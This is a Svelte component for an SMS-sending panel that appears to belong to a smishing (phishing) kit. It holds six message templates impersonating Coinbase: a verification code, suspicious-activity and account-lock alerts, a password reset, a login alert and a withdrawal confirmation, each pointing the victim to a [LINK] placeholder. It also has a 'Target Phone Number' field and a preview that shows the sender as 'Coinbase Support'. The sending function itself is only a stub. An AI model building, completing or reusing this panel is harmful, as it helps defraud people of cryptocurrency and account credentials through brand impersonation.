<script lang="ts">
	export let username: string;
	export let guild: string;

	import { fade, scale, slide } from 'svelte/transition';
	import { elasticOut } from 'svelte/easing';
	import placeholderImage from '$lib/previews/placeholder.png';

	const smsTemplates = {
		verification: {
			name: 'Verification Code',
			icon: 'lock',
			description: 'Send a verification code for account security',
			preview: 'Your Coinbase verification code is: 847291. Do not share this code with anyone.',
			category: 'Security'
		},
		suspicious_activity: {
			name: 'Suspicious Activity Alert',
			icon: 'warning',
			description: 'Alert about suspicious account activity',
			preview:
				'Suspicious activity detected on your Coinbase account. Please verify recent transactions at: [LINK]',
			category: 'Security'
		},
		account_locked: {
			name: 'Account Lock Notification',
			icon: 'lock_clock',
			description: 'Notify about account being temporarily locked',
			preview:
				'Your Coinbase account has been temporarily locked due to suspicious activity. Verify your identity at: [LINK]',
			category: 'Security'
		},
		password_reset: {
			name: 'Password Reset',
			icon: 'password',
			description: 'Send password reset instructions',
			preview: 'Reset your Coinbase account password by following this link: [LINK]',
			category: 'Account'
		},
		login_alert: {
			name: 'New Login Alert',
			icon: 'login',
			description: 'Alert about new device login',
			preview:
				"New login detected on your Coinbase account from [LOCATION]. If this wasn't you, secure your account at: [LINK]",
			category: 'Security'
		},
		withdrawal_confirm: {
			name: 'Withdrawal Confirmation',
			icon: 'payments',
			description: 'Confirm a pending withdrawal',
			preview: 'Confirm your Coinbase withdrawal of [AMOUNT] [CRYPTO]. Verify at: [LINK]',
			category: 'Transactions'
		}
	};

	let selectedTemplate = 'verification';
	let phoneNumber = '';
	let showFullscreenPreview = false;
	let isSubmitting = false;
	let formValid = false;

	$: currentTemplate = smsTemplates[selectedTemplate as keyof typeof smsTemplates];

	$: templateCategories = Object.entries(smsTemplates).reduce(
		(acc, [key, template]) => {
			if (!acc[template.category]) {
				acc[template.category] = [];
			}
			acc[template.category].push({ key, ...template });
			return acc;
		},
		{} as { [key: string]: any[] }
	);

	$: {
		formValid = phoneNumber.trim().length >= 10;
	}

	async function handleSubmit() {
		if (!formValid) return;

		isSubmitting = true;
		try {
			// SMS sending logic here
			console.log('Sending SMS with template:', selectedTemplate, 'to number:', phoneNumber);
			// Add your SMS sending implementation here
		} finally {
			isSubmitting = false;
		}
	}

	function formatPhoneNumber(input: string): string {
		const cleaned = input.replace(/\D/g, '');
		const match = cleaned.match(/^(\d{3})(\d{3})(\d{4})$/);
		if (match) {
			return '(' + match[1] + ') ' + match[2] + '-' + match[3];
		}
		return cleaned;
	}

	const getCurrentTime = () => {
		const now = new Date();
		return now.toLocaleTimeString('en-US', {
			hour: 'numeric',
			minute: '2-digit',
			hour12: true
		});
	};
</script>

<div class="smspanel" in:fade>
	<div class="intro">
		<div class="intro-content">
			<p>Your Hub for SMS Outreach</p>
			<h1 class="white">SMS</h1>
		</div>
		<div class="intro-stats">
			<div class="stat">
				<span class="material-icons">sms</span>
				<div class="stat-content">
					<p>Available Templates</p>
					<h3>{Object.keys(smsTemplates).length}</h3>
				</div>
			</div>
			<div class="stat">
				<span class="material-icons">category</span>
				<div class="stat-content">
					<p>Categories</p>
					<h3>{Object.keys(templateCategories).length}</h3>
				</div>
			</div>
		</div>
	</div>

	<div class="content-grid">
		<div class="left-panel">
			<div class="template-selection">
				<label class="section-label">
					<span class="material-icons">sms</span>
					Select SMS Template
				</label>
				<select class="styled-select" bind:value={selectedTemplate}>
					{#each Object.entries(templateCategories) as [category, templates]}
						<optgroup label="📱 {category}">
							{#each templates as template}
								<option value={template.key}>{template.name}</option>
							{/each}
						</optgroup>
					{/each}
				</select>
			</div>

			<div class="info-panel">
				<div class="info-section template-info">
					<div class="info-header">
						<span class="material-icons">{currentTemplate.icon}</span>
						<h3>{currentTemplate.name}</h3>
					</div>
					<div class="template-meta">
						<span class="category-badge">
							<span class="material-icons">folder</span>
							{currentTemplate.category}
						</span>
					</div>
					<p class="description">{currentTemplate.description}</p>
				</div>

				<div class="info-section">
					<div class="info-header">
						<span class="material-icons">phone</span>
						<h3>Target Phone Number</h3>
					</div>
					<div class="phone-input-container">
						<div class="input-wrapper">
							<input
								type="tel"
								bind:value={phoneNumber}
								placeholder="Enter phone number"
								class:filled={phoneNumber?.trim()}
								on:input={(e) => (phoneNumber = formatPhoneNumber(e.currentTarget.value))}
							/>
							{#if phoneNumber?.trim()}
								<span class="material-icons check-icon" in:scale={{ duration: 200 }}>
									check_circle
								</span>
							{/if}
						</div>
					</div>
				</div>
			</div>

			<button class="submit-button" on:click={handleSubmit} disabled={!formValid || isSubmitting}>
				<span class="material-icons">{isSubmitting ? 'sync' : 'send'}</span>
				{isSubmitting ? 'Sending...' : 'Send SMS'}
			</button>
		</div>

		<div class="preview-panel">
			<div class="preview-header">
				<span class="material-icons">preview</span>
				<h3>Message Preview</h3>
			</div>
			<div class="preview-container">
				<div class="phone-frame">
					<div class="phone-header">
						<div class="time">{getCurrentTime()}</div>
						<div class="status-icons">
							<span class="material-icons">signal_cellular_alt</span>
							<span class="material-icons">wifi</span>
							<span class="material-icons">battery_full</span>
						</div>
					</div>
					<div class="messages-container">
						<div class="message-bubble">
							<div class="message-header">
								<span class="sender">Coinbase Support</span>
								<span class="time">{getCurrentTime()}</span>
							</div>
							<div class="message-content">
								{currentTemplate.preview}
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<style>
	.smspanel {
		padding: 2em;
	}

	.intro {
		padding-bottom: 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
		margin-bottom: 2em;
		display: flex;
		justify-content: space-between;
		align-items: flex-end;
	}

	.intro-stats {
		display: flex;
		gap: 2em;
	}

	.stat {
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 1em 1.5em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		transition: all 0.3s ease;
	}

	.stat:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.stat .material-icons {
		color: rgba(98, 71, 218, 1);
		font-size: 1.5em;
	}

	.stat-content p {
		margin: 0;
		font-size: 0.8em;
		color: #8b8b8b;
	}

	.stat-content h3 {
		margin: 0;
		font-size: 1.2em;
		color: white;
	}

	.content-grid {
		display: grid;
		grid-template-columns: 1fr 400px;
		gap: 2em;
	}

	.left-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
	}

	.section-label {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		margin-bottom: 0.8em;
	}

	.styled-select {
		width: 100%;
		padding: 1em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.styled-select:hover {
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.styled-select optgroup {
		background: #0e0d15;
		color: #8b8b8b;
		font-weight: 500;
		padding: 0.5em;
	}

	.styled-select option {
		background: #16171a;
		color: white;
		padding: 0.8em;
	}

	.info-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
	}

	.info-section {
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		padding: 1.2em;
		transition: all 0.3s ease;
	}

	.template-info {
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, rgba(14, 13, 21, 0.95) 100%);
	}

	.info-section:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.template-meta {
		margin: 1em 0;
	}

	.category-badge {
		display: inline-flex;
		align-items: center;
		gap: 0.4em;
		padding: 0.4em 0.8em;
		background: rgba(98, 71, 218, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 2em;
		font-size: 0.8em;
		color: rgba(98, 71, 218, 1);
	}

	.category-badge .material-icons {
		font-size: 1em;
	}

	.info-header {
		display: flex;
		align-items: center;
		gap: 0.5em;
		margin-bottom: 0.8em;
		color: rgba(98, 71, 218, 1);
	}

	.info-header h3 {
		margin: 0;
		font-size: 1em;
		font-weight: 500;
	}

	.description {
		color: #8b8b8b;
		font-size: 0.9em;
		line-height: 1.6;
		margin: 0;
	}

	.phone-input-container {
		margin-top: 0.5em;
	}

	.input-wrapper {
		position: relative;
		display: flex;
		align-items: center;
	}

	.input-wrapper input {
		width: 100%;
		padding: 0.8em;
		padding-right: 2.5em;
		background: rgba(14, 13, 21, 0.6);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.5em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		transition: all 0.3s ease;
	}

	.input-wrapper input:focus {
		outline: none;
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.input-wrapper input.filled {
		border-color: rgba(98, 71, 218, 0.4);
	}

	.check-icon {
		position: absolute;
		right: 0.8em;
		color: #4caf50;
		font-size: 1.2em;
	}

	.preview-panel {
		background: rgba(14, 13, 21, 0.8);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 1.5em;
		display: flex;
		flex-direction: column;
		gap: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
	}

	.preview-header {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding-bottom: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.preview-header h3 {
		margin: 0;
		font-size: 1.1em;
		font-weight: 500;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.preview-container {
		position: relative;
		width: 100%;
		padding-top: 160%;
		background: rgba(14, 13, 21, 0.9);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		overflow: hidden;
	}

	.phone-frame {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		display: flex;
		flex-direction: column;
		background: #0e0d15;
	}

	.phone-header {
		padding: 1em;
		display: flex;
		justify-content: space-between;
		align-items: center;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.status-icons {
		display: flex;
		gap: 0.5em;
		color: rgba(255, 255, 255, 0.7);
	}

	.status-icons .material-icons {
		font-size: 1em;
	}

	.messages-container {
		flex-grow: 1;
		padding: 1em;
		overflow-y: auto;
	}

	.message-bubble {
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 1em;
		margin-bottom: 1em;
		max-width: 90%;
		transition: all 0.3s ease;
	}

	.message-bubble:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.5);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.3);
	}

	.message-header {
		display: flex;
		justify-content: space-between;
		align-items: center;
		margin-bottom: 0.5em;
		font-size: 0.8em;
	}

	.sender {
		color: rgba(98, 71, 218, 1);
		font-weight: 500;
	}

	.time {
		color: #8b8b8b;
	}

	.message-content {
		color: white;
		line-height: 1.4;
		font-size: 0.9em;
	}

	.submit-button {
		width: 100%;
		padding: 1em;
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 0.5em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 0.8em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.submit-button:not(:disabled):hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.submit-button:disabled {
		opacity: 0.6;
		cursor: not-allowed;
	}

	.submit-button .material-icons {
		font-size: 1.2em;
	}

	@keyframes spin {
		from {
			transform: rotate(0deg);
		}
		to {
			transform: rotate(360deg);
		}
	}

	.submit-button:disabled .material-icons {
		animation: spin 1s linear infinite;
	}
</style>
